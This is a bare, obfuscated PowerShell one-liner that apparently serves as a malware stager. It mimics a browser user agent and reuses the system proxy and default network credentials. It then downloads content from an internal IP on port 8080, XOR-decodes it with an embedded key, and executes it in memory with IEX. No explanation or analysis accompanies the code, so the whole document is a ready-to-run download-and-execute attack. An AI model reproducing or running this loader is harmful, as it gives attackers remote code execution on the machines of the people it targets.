
[SYstEM.NEt.SErViCEPOiNTMANAgER]::ExPecT100COntinUE = 0;$Wc=New-ObjeCt SysteM.NeT.WeBCLIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdeRs.ADd('User-Agent',$u);$Wc.PROxY = [SyStEm.NeT.WEBREQUeST]::DEFaUlTWEbPrOxY;$wC.PRoxY.CrEDeNtiAlS = [SysTem.NEt.CRedeNtiAlCAcHE]::DefAulTNETWORkCrEDEntIals;$K='8853bb10b83b5d276cfcf13a03100665';$i=0;[CHAR[]]$B=([Char[]]($Wc.DoWNloADStRinG("http://192.168.0.111:8080/index.asp")))|%{$_-bXor$k[$I++%$K.LeNgth]};IEX ($B-JOin'')

